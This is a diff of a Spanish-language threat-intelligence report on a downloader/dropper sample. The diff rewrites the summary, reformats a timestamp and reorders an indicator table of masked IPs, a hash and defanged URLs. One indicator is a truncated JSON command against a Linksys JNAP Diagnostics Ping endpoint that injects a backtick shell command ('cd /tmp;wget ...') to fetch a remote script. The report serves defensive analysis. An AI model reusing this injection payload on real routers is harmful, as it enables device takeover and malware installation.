@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 465 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Diagnostics` en `hxxp://linksys[.]com/jnap/network/Diagnostics`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:42:54+00:00`
+- **Registrado:** `2026-08-09T19:42:54.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -50,12 +51,12 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.175.XXX | static_analysis |
-| ip | 91.92.40.XXX | static_analysis |
-| url | hxxp://91.92.40.XXX/wget.sh | strings |
 | url | hxxp://linksys[.]com/jnap/network/Diagnostics | strings |
-| hash | 8f3e039cd793c72f54b4cdff16e22caf01baf4891765a7603ec4392b543f5e39 | static_analysis |
+| url | hxxp://91.92.40.XXX/wget.sh | strings |
+| ip | 91.92.40.XXX | static_analysis |
+| ip | 190.179.175.XXX | static_analysis |
 | command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/network/Diagnostics","command":"Ping","target":"[internal-ip-redacted]%20`cd /tmp;wget htt | strings |
+| hash | 8f3e039cd793c72f54b4cdff16e22caf01baf4891765a7603ec4392b543f5e39 | static_analysis |
 | ip | 45.156.87.XXX | artifact_source |
 
 ## 🛡️ Nota de publicación
